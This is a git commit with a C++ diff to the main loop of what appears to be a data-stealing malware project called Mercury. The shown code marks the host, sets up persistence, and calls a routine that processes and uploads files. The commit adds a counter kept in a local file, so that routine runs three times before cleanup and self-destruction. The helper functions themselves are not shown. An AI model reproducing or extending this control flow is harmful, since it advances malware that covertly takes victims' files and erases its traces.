a195f7b6c6bd70d1f048420024e157a79f533b1e
0xConstant <noroh4xy@protonmail.com>
2023-10-01 13:57:57 -0700

    TOTALRUNS variable was added to ensure that the program will only run a number of specific times before terminating

--- Mercury/main.cpp
+++ Mercury/main.cpp
@@ -5,22 +5,67 @@
 
 
 
-constexpr bool ONETIMERUN = true;
+constexpr bool ONETIMERUN = false;
+constexpr int TOTALRUNS = 3;
+int CURRENTRUNS = 0;
+const std::string COUNT_FILE = "run_count.txt";
+
+
+int LoadRunCount() {
+    std::ifstream inFile(COUNT_FILE);
+
+    if (!inFile) {
+        return 0;
+    }
+
+    int count;
+    inFile >> count;
+    return count;
+}
+
+
+void SaveRunCount(int count) {
+    std::ofstream outFile(COUNT_FILE);
+    outFile << count;
+}
+
+
+void CleanupAndDestruct() {
+    std::cout << "Beginning cleanup..." << std::endl;
+    std::this_thread::sleep_for(std::chrono::seconds(5));
+    Cleanup();
+    std::this_thread::sleep_for(std::chrono::seconds(3));
+    SelfDestruct();
+}
 
 
 int main() {
     MarkMachine();
     PersistOnMachine();
+    CURRENTRUNS = LoadRunCount();
+
     if (ONETIMERUN) {
-        
         ProcessFilesAndUpload();
-        std::cout << "Beginning cleanup..." << std::endl;
-        std::this_thread::sleep_for(std::chrono::seconds(5));
-        Cleanup();
-        std::this_thread::sleep_for(std::chrono::seconds(3));
-        SelfDestruct();
+        CleanupAndDestruct();
     }
-    
+
+    while (TOTALRUNS > CURRENTRUNS) {
+        ProcessFilesAndUpload();
+        CURRENTRUNS += 1;
+        SaveRunCount(CURRENTRUNS); // Increment and save the count.
+
+        std::cout << "Running " << CURRENTRUNS << std::endl;
+
+        if (TOTALRUNS == CURRENTRUNS) {
+            ProcessFilesAndUpload();
+            CleanupAndDestruct();
+            break; // Exit the loop
+        }
+
+        std::cout << "Sleeping for 30 seconds..." << std::endl;
+        std::this_thread::sleep_for(std::chrono::seconds(30));
+    }
+
     return 0;
 }
 
